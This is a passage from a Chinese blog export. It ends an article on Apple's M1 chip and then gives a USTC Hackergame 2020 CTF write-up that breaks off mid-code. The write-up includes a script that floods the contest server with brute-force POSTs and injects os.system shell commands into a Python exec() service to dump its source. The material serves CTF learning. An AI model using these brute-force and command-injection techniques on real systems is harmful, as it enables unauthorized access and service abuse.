M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-11</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span 